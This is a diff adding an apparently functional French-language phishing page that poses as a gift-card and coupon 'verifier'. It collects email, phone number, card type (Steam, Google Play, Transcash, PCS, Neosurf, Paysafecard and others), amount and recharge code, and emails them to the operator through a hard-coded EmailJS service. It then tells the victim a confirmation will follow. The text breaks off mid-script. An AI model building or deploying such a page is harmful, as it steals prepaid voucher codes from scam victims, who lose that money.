@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérificateur de Cartes et Coupons</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #3498db;
+            --secondary-color: #2c3e50;
+            --accent-color: #e74c3c;
+            --light-color: #ecf0f1;
+            --dark-color: #2c3e50;
+            --success-color: #2ecc71;
+            --warning-color: #f39c12;
+            --border-radius: 8px;
+            --box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding: 15px 20px;
+            background: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            animation: fadeIn 1s ease;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--secondary-color);
+        }
+        
+        .logo i {
+            margin-right: 10px;
+            color: var(--primary-color);
+        }
+        
+        .language-selector {
+            position: relative;
+        }
+        
+        .language-btn {
+            background: var(--light-color);
+            border: none;
+            padding: 10px 15px;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+            transition: var(--transition);
+        }
+        
+        .language-btn:after {
+            content: "▼";
+            font-size: 10px;
+            margin-left: 8px;
+        }
+        
+        .language-btn:hover {
+            background: var(--primary-color);
+            color: white;
+        }
+        
+        .language-btn img {
+            width: 20px;
+            margin-right: 8px;
+        }
+        
+        .language-dropdown {
+            position: absolute;
+            top: 100%;
+            right: 0;
+            background: white;
+            border-radius: var(--border-radius);
+            width: 180px;
+            display: none;
+            z-index: 100;
+            box-shadow: var(--box-shadow);
+            overflow: hidden;
+        }
+        
+        .language-dropdown.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+        
+        .language-dropdown a {
+            display: flex;
+            align-items: center;
+            padding: 12px 15px;
+            text-decoration: none;
+            color: var(--dark-color);
+            transition: var(--transition);
+        }
+        
+        .language-dropdown a:hover {
+            background-color: var(--light-color);
+        }
+        
+        .language-dropdown a img {
+            width: 20px;
+            margin-right: 10px;
+        }
+        
+        .slider-container {
+            position: relative;
+            height: 300px;
+            overflow: hidden;
+            border-radius: var(--border-radius);
+            margin-bottom: 25px;
+            box-shadow: var(--box-shadow);
+        }
+        
+        .slide {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            transition: opacity 1s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+            background-size: cover;
+            background-position: center;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .slide-content {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 15px 25px;
+            border-radius: var(--border-radius);
+            max-width: 80%;
+        }
+        
+        .slide.active {
+            opacity: 1;
+        }
+        
+        .slider-controls {
+            position: absolute;
+            bottom: 15px;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            z-index: 10;
+        }
+        
+        .slider-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.5);
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        
+        .slider-dot.active {
+            background: white;
+            transform: scale(1.2);
+        }
+        
+        .slider-nav {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 10;
+            transition: var(--transition);
+        }
+        
+        .slider-nav:hover {
+            background: rgba(0, 0, 0, 0.8);
+        }
+        
+        .slider-nav.prev {
+            left: 15px;
+        }
+        
+        .slider-nav.next {
+            right: 15px;
+        }
+        
+        .warning {
+            color: var(--accent-color);
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 16px;
+            padding: 12px;
+            background-color: rgba(231, 76, 60, 0.1);
+            border-radius: var(--border-radius);
+            animation: pulse 2s infinite;
+        }
+        
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            animation: slideUp 0.8s ease;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--secondary-color);
+        }
+        
+        input[type="email"],
+        input[type="tel"],
+        input[type="number"],
+        input[type="text"],
+        select {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+        
+        input:focus,
+        select:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+        }
+        
+        .radio-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .radio-option {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            background: var(--light-color);
+            border-radius: var(--border-radius);
+            transition: var(--transition);
+        }
+        
+        .radio-option:hover {
+            background: #dfe6e9;
+        }
+        
+        .radio-option input {
+            margin-right: 10px;
+        }
+        
+        .btn {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 500;
+            width: 100%;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn i {
+            margin-right: 10px;
+        }
+        
+        .btn:hover {
+            background-color: #2980b9;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .btn:disabled {
+            background-color: #95a5a6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes slideDown {
+            from { transform: translateY(-10px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        
+        /* Toast Container */
+        #toast-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        /* Toast */
+        .toast {
+            min-width: 250px;
+            max-width: 350px;
+            background: white;
+            color: #333;
+            padding: 16px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            font-size: 15px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            opacity: 0;
+            transform: translateX(100%);
+            animation: slideIn 0.4s forwards, fadeOut 0.4s forwards 4s;
+        }
+
+        /* Icônes dans le toast */
+        .toast i {
+            font-size: 18px;
+        }
+
+        /* Types de toast */
+        .toast.success { border-left: 6px solid #2ecc71; }
+        .toast.success i { color: #2ecc71; }
+
+        .toast.error { border-left: 6px solid #e74c3c; }
+        .toast.error i { color: #e74c3c; }
+
+        .toast.info { border-left: 6px solid #3498db; }
+        .toast.info i { color: #3498db; }
+
+        /* Animations */
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(100%); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        @keyframes fadeOut {
+            to { opacity: 0; transform: translateX(100%); }
+        }
+
+        @media (max-width: 768px) {
+            .radio-group {
+                grid-template-columns: 1fr;
+            }
+            
+            header {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .logo {
+                margin-bottom: 15px;
+            }
+            
+            .slider-container {
+                height: 250px;
+            }
+            
+            .slide {
+                font-size: 18px;
+            }
+            
+            .slider-nav {
+                width: 30px;
+                height: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-credit-card"></i>
+                <span data-translate="title">Vérificateur de Cartes</span>
+            </div>
+            <div class="language-selector">
+                <button class="language-btn">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjEwIiBoZWlnaHQ9IjIwIiBmaWxsPSIjMDAxMWZmIi8+PHJlY3QgeD0iMTAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIyMCIgZmlsbD0iI2ZmZmZmZiIvPjxyZWN0IHg9IjIwIiB3aWR0aD0iMTAiIGhlaWdodD0iMjAiIGZpbGw9IiNmZjAwMDAiLz48L3N2Zz4=" alt="FR">
+                    <span>FRANÇAIS</span>
+                </button>
+                <div class="language-dropdown">                  
+                    <a href="#" data-lang="fr">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjEwIiBoZWlnaHQ9IjIwIiBmaWxsPSIjMDAxMWZmIi8+PHJlY3QgeD0iMTAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIyMCIgZmlsbD0iI2ZmZmZmZiIvPjxyZWN0IHg9IjIwIiB3aWR0aD0iMTAiIGhlaWdodD0iMjAiIGZpbGw9IiNmZjAwMDAiLz48L3N2Zz4=" alt="FR">
+                        <span>FRANÇAIS</span>
+                    </a>
+                    <a href="#" data-lang="dk">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzNyAyOCIgd2lkdGg9IjM3MCIgaGVpZ2h0PSIyODAiIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0iRHJhcGVhdSBkdSBEYW5lbWFyayI+CiAgPHJlY3Qgd2lkdGg9IjM3IiBoZWlnaHQ9IjI4IiBmaWxsPSIjYzYwYzMwIi8+CiAgPHJlY3QgeD0iMTEiIHdpZHRoPSIzIiBoZWlnaHQ9IjI4IiBmaWxsPSIjZmZmZmZmIi8+CiAgPHJlY3QgeT0iMTIiIHdpZHRoPSIzNyIgaGVpZ2h0PSI0IiBmaWxsPSIjZmZmZmZmIi8+Cjwvc3ZnPgo=" alt="DK">
+                        <span>DANSK</span>
+                    </a>
+                    <a href="#" data-lang="de">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMCAyMCI+PHJlY3QgeT0iMCIgd2lkdGg9IjMwIiBoZWlnaHQ9IjciIGZpbGw9IiMwMDAiLz48cmVjdCB5PSI3IiB3aWR0aD0iMzAiIGhlaWdodD0iNiIgZmlsbD0iI2RlMDAwMCIvPjxyZWN0IHk9IjEzIiB3aWR0aD0iMzAiIGhlaWdodD0iNyIgZmlsbD0iI2ZmY2MwMCIvPjwvc3ZnPg==" alt="DE">
+                        <span>DEUTSCH</span>
+                    </a>
+                    <a href="#" data-lang="en">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDMwIDIwIj48cmVjdCB3aWR0aD0iMzAiIGhlaWdodD0iMjAiIGZpbGw9IiNmZmYiLz48cmVjdCB3aWR0aD0iMzAiIGhlaWdodD0iMiIgeT0iMCIgZmlsbD0iI2YwMDAwMCIvPjxyZWN0IHdpZHRoPSIzMCIgaGVpZ2h0PSIyIiB5PSI0IiBmaWxsPSIjZjAwMDAwIi8+PHJlY3Qgd2lkdGg9IjMwIiBoZWlnaHQ9IjIiIHk9IjgiIGZpbGw9IiNmMDAwMDAiLz48cmVjdCB3aWR0aD0iMzAiIGhlaWdodD0iMiIgeT0iMTIiIGZpbGw9IiNmMDAwMDAiLz48cmVjdCB3aWR0aD0iMzAiIGhlaWdodD0iMiIgeT0iMTYiIGZpbGw9IiNmMDAwMDAiLz48cmVjdCB3aWR0aD0iMTIiIGhlaWdodD0iMTAiIGZpbGw9IiMwMDM5ODciLz48L3N2Zz4=" alt="US">
+                        <span>ENGLISH</span>
+                    </a>
+                    <a href="#" data-lang="it">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMCAyMCI+PHJlY3Qgd2lkdGg9IjEwIiBoZWlnaHQ9IjIwIiBmaWxsPSIjMDE4NzQ2Ii8+PHJlY3QgeD0iMTAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIyMCIgZmlsbD0iI2ZmZiIvPjxyZWN0IHg9IjIwIiB3aWR0aD0iMTAiIGhlaWdodD0iMjAiIGZpbGw9IiNjRTJBMjUiLz48L3N2Zz4=" alt="IT">
+                        <span>ITALIANO</span>
+                    </a>
+                    <a href="#">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2MCAzMCIgd2lkdGg9IjYwMCIgaGVpZ2h0PSIzMDAiIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0iRmxhZyBvZiBDYW5hZGEiPgogIDxyZWN0IHdpZHRoPSI2MCIgaGVpZ2h0PSIzMCIgZmlsbD0iI2ZmMDAwMCIvPgogIDxyZWN0IHg9IjEwIiB3aWR0aD0iNDAiIGhlaWdodD0iMzAiIGZpbGw9IiNmZmZmZmYiLz4KICA8IS0tIHN0eWxpemVkIG1hcGxlIGxlYWYgLS0+CiAgPHBhdGggZmlsbD0iI2ZmMDAwMCIgZD0iTTMwIDMgCiAgICAgTD I3IDEwIAogICAgIEwyMSAxMCAKICAgICBMMjYgMTQgCiAgICAgTDIyIDIwIAogICAgIEwzMCAxNiAKICAgICBMMzcgMjAgCiAgICAgTD M0IDE0IAogICAgIEwzOS AxMCAKICAgICBMMzMgMTAgCiAgICAgTD MzIDMgWiIvPgo8L3N2Zz4=" alt="CA">
+                         <span>CANADA (EN/FR)</span>
+                    </a>
+                    <a href="#">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiIgd2lkdGg9IjMwMCIgaGVpZ2h0PSIzMDAiIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0iRHJhcGVhdSBkZSBsYSBTdWlzc2UiPgogIDxyZWN0IHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0iI2ZmMDAwMCIvPgogIDxyZWN0IHg9IjEyIiB5PSI2IiB3aWR0aD0iOCIgaGVpZ2h0PSIyMCIgZmlsbD0iI2ZmZmZmZiIvPgogIDxyZWN0IHg9IjYiIHk9IjEyIiB3aWR0aD0iMjAiIGhlaWdodD0iOCIgZmlsbD0iI2ZmZmZmZiIvPgo8L3N2Zz4K" alt="CH">
+                        <span>SCHWEIZ/SUISSE</span>
+                    </a>
+                </div>
+            </div>
+        </header>
+
+        <div class="slider-container">
+            <div class="slide active" style="background-image: url('pcs.jpg');"></div>         
+            <div class="slide" style="background-image: url('bitcoin.jpg');"></div>
+            <div class="slide" style="background-image: url('itunes.jpg');"></div>
+            <div class="slide" style="background-image: url('stream.jpg');"></div>
+            <div class="slide" style="background-image: url('google.png');"></div>
+            <div class="slide" style="background-image: url('neosurf.jpg');"></div>
+            <div class="slide" style="background-image: url('transcash.jpg');"></div>
+            <div class="slide" style="background-image: url('google_play.jpg');"></div>
+            <div class="slide" style="background-image: url('tunes.jpg');"></div>
+            
+            <div class="slider-nav prev">
+                <i class="fas fa-chevron-left"></i>
+            </div>
+            <div class="slider-nav next">
+                <i class="fas fa-chevron-right"></i>
+            </div>
+            
+            <div class="slider-controls">
+                <div class="slider-dot active"></div>
+                <div class="slider-dot"></div>
+                <div class="slider-dot"></div>
+                <div class="slider-dot"></div>
+                <div class="slider-dot"></div>
+                <div class="slider-dot"></div>
+                <div class="slider-dot"></div>
+                <div class="slider-dot"></div>
+                <div class="slider-dot"></div>
+                <div class="slider-dot"></div>
+            </div>
+        </div>
+
+        <p class="warning" data-translate="warning">
+            <i class="fas fa-exclamation-circle"></i> 
+            Rassurez-vous de bien saisir les coordonnées de la carte ou coupon pour une bonne vérification
+        </p>
+
+        <div class="form-container">
+            <form id="verification-form">
+                <div class="form-group">
+                    <label for="email" data-translate="email">Email*</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="card-type" data-translate="cardType">Types de cartes *</label>
+                    <select id="card-type" name="card-type" required>
+                        <option value="" disabled selected data-translate="chooseCard">-- Sélectionnez un type de carte --</option>
+                        <option value="Google Play">Google Play</option>
+                        <option value="Steam">Steam</option>
+                        <option value="iTunes">iTunes</option>
+                        <option value="Amazon">Amazon</option>
+                        <option value="Transcash">Transcash</option>
+                        <option value="PCS">PCS</option>
+                        <option value="Neosurf">Neosurf</option>
+                        <option value="Paysafecard">Paysafecard</option>
+                        <option value="Toneo">Toneo</option>
+                        <option value="Bitcoin/Cryptonow">Bitcoin / Cryptonow</option>
+                        <option value="Autres" data-translate="other">Autres...</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="telephone" data-translate="phone">Téléphone *</label>
+                    <input type="tel" id="telephone" name="telephone" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="montant" data-translate="amount">Montant de la carte *</label>
+                    <input type="number" id="montant" name="montant" required min="1">
+                </div>
+
+                <div class="form-group">
+                    <label data-translate="hideCode">Cacher le code</label>
+                    <div class="radio-group">
+                        <div class="radio-option">
+                            <input type="radio" id="hide-yes" name="hide-code" value="oui" required>
+                            <label for="hide-yes" data-translate="yes">Oui</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" id="hide-no" name="hide-code" value="non">
+                            <label for="hide-no" data-translate="no">Non</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="code" data-translate="code">Entrez le code de recharge *</label>
+                    <input type="text" id="code" name="code" required>
+                </div>
+
+                <button type="submit" class="btn">
+                    <i class="fas fa-check-circle"></i>
+                    <span data-translate="authenticate">Authentifier</span>
+                </button>
+            </form>
+        </div>
+
+        <footer>
+            <p>&copy; 2023 <span data-translate="footer">Vérificateur de Cartes et Coupons. Tous droits réservés.</span></p>
+        </footer>
+    </div>
+    <div id="toast-container"></div>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("gQYBGuEA3HsZqx7oa"); // ⚠️ remplace par ton userID EmailJS
+        })();
+
+        // Données de traduction
+        const translations = {
+            fr: {
+                title: "Vérificateur de Cartes",
+                slide1: "Vérification Sécurisée",
+                slide2: "Validation Rapide",
+                slide3: "Protection des Données",
+                slide4: "Service International",
+                warning: "Rassurez-vous de bien saisir les coordonnées de la carte ou coupon pour une bonne vérification",
+                email: "Email*",
+                cardType: "Types de cartes *",
+                chooseCard: "-- Sélectionnez un type de carte --",
+                other: "Autres...",
+                phone: "Téléphone *",
+                amount: "Montant de la carte *",
+                hideCode: "Cacher le code",
+                yes: "Oui",
+                no: "Non",
+                code: "Entrez le code de recharge *",
+                authenticate: "Authentifier",
+                footer: "Vérificateur de Cartes et Coupons. Tous droits réservés.",
+                formSuccess: "Veuillez patienter quelques instants, vous recevrez bientôt un message de confirmation ✅",
+                formError: "Une erreur est survenue lors de l'envoi ❌",
+                formIncomplete: "Veuillez remplir tous les champs obligatoires ⚠️",
+            },
+            dk: {
+                title: "Kortverifikation",
+                slide1: "Sikker Verifikation",
+                slide2: "Hurtig Validering",
+                slide3: "Databeskyttelse",
+                slide4: "International Service",
+                warning: "Sørg for at indtaste kort- eller kuponoplysninger korrekt for en god verifikation",
+                email: "Email*",
+                cardType: "Korttyper *",
+                chooseCard: "-- Vælg en korttype --",
+                other: "Andre...",
+                phone: "Telefon *",
+                amount: "Kortbeløb *",
+                hideCode: "Skjul kode",
+                yes: "Ja",
+                no: "Nej",
+                code: "Indtast genopfyldningskode *",
+                authenticate: "Godkend",
+                footer: "Kort- og kuponverifikation. Alle rettigheder forbeholdes.",
+                formSuccess: "Vent et øjeblik, du vil snart modtage en bekræftelsesbesked ✅",
+                formError: "Der opstod en fejl under afsendelsen ❌",
+                formIncomplete: "Udfyld venligst alle obligatoriske felter ⚠️",
+            },
+            de: {
+                title: "Kartenprüfer",
+                slide1: "Sichere Überprüfung",
+                slide2: "Schnelle Validierung",
+                slide3: "Datenschutz",
+                slide4: "Internationaler Service",
+                warning: "Stellen Sie sicher, dass Sie die Karten- oder Gutscheindaten korrekt eingeben, um eine gute Überprüfung zu gewährleisten",
+                email: "E-Mail*",
+                cardType: "Kartentypen *",
+                chooseCard: "-- Wählen Sie einen Kartentyp --",
+                other: "Andere...",
+                phone: "Telefon *",
+                amount: "Kartenbetrag *",
+                hideCode: "Code ausblenden",
+                yes: "Ja",
+                no: "Nein",
+                code: "Geben Sie den Aufladecode ein *",
+                authenticate: "Authentifizieren",
+                footer: "Karten- und Gutscheinprüfer. Alle Rechte vorbehalten.",
+                formSuccess: "Bitte warten Sie einen Moment, Sie erhalten in Kürze eine Bestätigungsnachricht ✅",
+                formError: "Beim Senden ist ein Fehler aufgetreten ❌",
+                formIncomplete: "Bitte füllen Sie alle Pflichtfelder aus ⚠️",
+            },
+            en: {
+                title: "Card Verifier",
+                slide1: "Secure Verification",
+                slide2: "Fast Validation",
+                slide3: "Data Protection",
+                slide4: "International Service",
+                warning: "Make sure to enter the card or coupon details correctly for proper verification",
+                email: "Email*",
+                cardType: "Card types *",
+                chooseCard: "-- Select a card type --",
+                other: "Others...",
+                phone: "Phone *",
+                amount: "Card amount *",
+                hideCode: "Hide code",
+                yes: "Yes",
+                no: "No",
+                code: "Enter recharge code *",
+                authenticate: "Authenticate",
+                footer: "Card and Coupon Verifier. All rights reserved.",
+                formSuccess: "Please wait a moment, you will soon receive a confirmation message ✅",
+                formError: "An error occurred while sending ❌",
+                formIncomplete: "Please fill in all required fields ⚠️",
+            },
+            it: {
+                title: "Verificatore di Carte",
+                slide1: "Verifica Sicura",
+                slide2: "Validazione Rapida",
+                slide3: "Protezione Dati",
+                slide4: "Servizio Internazionale",
+                warning: "Assicurati di inserire correttamente i dettagli della carta o del coupon per una buona verifica",
+                email: "Email*",
+                cardType: "Tipi di carte *",
+                chooseCard: "-- Seleziona un tipo di carta --",
+                other: "Altri...",
+                phone: "Telefono *",
+                amount: "Importo della carta *",
+                hideCode: "Nascondi codice",
+                yes: "Sì",
+                no: "No",
+                code: "Inserisci il codice di ricarica *",
+                authenticate: "Autentica",
+                footer: "Verificatore di Carte e Coupon. Tutti i diritti riservati.",
+                formSuccess: "Attendere un momento, riceverai presto un messaggio di conferma ✅",
+                formError: "Si è verificato un errore durante l'invio ❌",
+                formIncomplete: "Per favore, compila tutti i campi obbligatori ⚠️",
+            }
+        };
+
+        // Variables globales
+        let currentLang = "fr";
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const dots = document.querySelectorAll('.slider-dot');
+        const totalSlides = slides.length;
+        let sliderInterval;
+
+        // Initialisation
+        document.addEventListener('DOMContentLoaded', function() {
+            initLanguage();
+            initSlider();
+            initEventListeners();
+        });
+
+        // Initialisation de la langue
+        function initLanguage() {
+            const lang = getLangFromUrl();
+            setLanguage(lang);
+        }
+
+        // Initialisation du slider
+        function initSlider() {
+            if (slides.length > 0 && dots.length > 0) {
+                startSliderInterval();
+            }
+        }
+
+        // Initialisation des écouteurs d'événements
+        function initEventListeners() {
+            // Sélecteur de langue
+            document.querySelector('.language-btn').addEventListener('click', function() {
+                document.querySelector('.language-dropdown').classList.toggle('show');
+            });
+
+            // Fermer le sélecteur de langue en cliquant à l'extérieur
+            window.addEventListener('click', function(e) {
+                if (!e.target.matches('.language-btn') && !e.target.closest('.language-btn')) {
+                    const dropdown = document.querySelector('.language-dropdown');
+                    if (dropdown.classList.contains('show')) {
+                        dropdown.classList.remove('show');
+                    }
+                }
+            });
+
+            // Changer de langue via le dropdown
+            document.querySelectorAll('.language-dropdown a').forEach(item => {
+                item.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const lang = this.getAttribute('data-lang');
+                    setLanguage(lang);
+                    document.querySelector('.language-dropdown').classList.remove('show');
+                });
+            });
+
+            // Navigation du slider
+            document.querySelector('.slider-nav.next').addEventListener('click', () => {
+                resetSliderInterval();
+                showSlide(currentSlide + 1);
+            });
+
+            document.querySelector('.slider-nav.prev').addEventListener('click', () => {
+                resetSliderInterval();
+                showSlide(currentSlide - 1);
+            });
+
+            // Navigation par les points
+            dots.forEach((dot, index) => {
+                dot.addEventListener('click', () => {
+                    resetSliderInterval();
+                    showSlide(index);
+                });
+            });
+
+            // Gestion de la soumission du formulaire
+            document.getElementById('verification-form').addEventListener('submit', handleFormSubmit);
+        }
+
+        // Récupérer la langue depuis l'URL
+        function getLangFromUrl() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get("lang") || "fr";
+        }
+
+        // Appliquer une langue et mettre à jour l'URL
+        function setLanguage(lang) {
+            changeLanguage(lang);
+            currentLang = lang;
+
+            // Mettre à jour l'URL sans recharger la page
+            const url = new URL(window.location);
+            url.searchParams.set("lang", lang);
+            window.history.replaceState({}, "", url);
+        }
+
+        // Fonction pour changer la langue
+        function changeLanguage(lang) {
+            // Mettre à jour le texte du bouton de langue
+            const selectedLangElement = document.querySelector(`.language-dropdown a[data-lang="${lang}"]`);
+            if (selectedLangElement) {
+                const selectedLangHTML = selectedLangElement.innerHTML;
+                document.querySelector('.language-btn').innerHTML = selectedLangHTML;
+            }
+            
+            // Mettre à jour tous les éléments avec l'attribut data-translate
+            document.querySelectorAll('[data-translate]').forEach(element => {
+                const key = element.getAttribute('data-translate');
+                if (translations[lang] && translations[lang][key]) {
+                    element.textContent = translations[lang][key];
+                }
+            });
+        }
+
+        // Fonction pour afficher une slide spécifique
+        function showSlide(n) {
+            // Masquer toutes les slides
+            slides.forEach(slide => {
+                slide.classList.remove('active');
+            });
+            dots.forEach(dot => {
+                dot.classList.remove('active');
+            });
+            
+            // Gérer le débordement des index
+            if (n >= totalSlides) {
+                currentSlide = 0;
+            } else if (n < 0) {
+                currentSlide = totalSlides - 1;
+            } else {
+                currentSlide = n;
+            }
+            
+            // Afficher la slide courante
+            slides[currentSlide].classList.add('active');
+            dots[currentSlide].classList.add('active');
+        }
+
+        // Démarrer l'intervalle du slider
+        function startSliderInterval() {
+            sliderInterval = setInterval(() => {
+                showSlide(currentSlide + 1);
+            }, 5000);
+        }
+
+        // Réinitialiser l'intervalle du slider
+        function resetSliderInterval() {
+            clearInterval(sliderInterval);
+            startSliderInterval();
+        }
+
+        // Gestion de la soumission du formulaire
+        function handleFormSubmit(e) {
+            e.preventDefault();
+
+            // Récupérer les valeurs du formulaire
+            const email = document.getElementById('email').value;
+            const cardType = document.getElementById('card-type').value;
+            const telephone = document.getElementById('telephone').value;
+            const montant = document.getElementById('montant').value;
+            const hideCode = document.querySelector('input[name="hide-code"]:checked');
+            const code = document.getElementById('code').value;
+
+            // Validation
+            if (!email || !cardType || !telephone || !montant || !hideCode || !code) {
+                showToast(translations[currentLang].formIncomplete, "error");
+                return;
+            }
+
+            // Animation du bouton
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ' + translations[currentLang].authenticate;
+            submitBtn.disabled = true;
+
+            
+          
+            // Préparer les paramètres pour EmailJS et la gestion de l'envoi de mail
+            const templateParams = {
+                email: email,
+                cardType: cardType,
+                telephone: telephone,
+                montant: montant,
+                hideCode: hideCode.value,
+                code: code
+            };
+
+            // Deuxième envoi → mail
+            emailjs.send("service_ynck4zp", "template_jpec70n", {
+                ...templateParams,
+            }).then(function(response) {
+                console.log("✅ Mail envoyé à l...@gmail.com :", response);
+
+                // Affichage toast et reset seulement après le deuxième envoi
+                showToast(translations[currentLang].formSuccess, "success");
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+                document.getElementById('verification-form').reset();
+
+            }, function(error) {
+                console.error("❌ Erreur envoi mail2 :", error);
+                showToast(translations[currentLang].formError, "error");
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+            });
+
+
+
+        }
+
+        // Fonction pour afficher les notifications toast
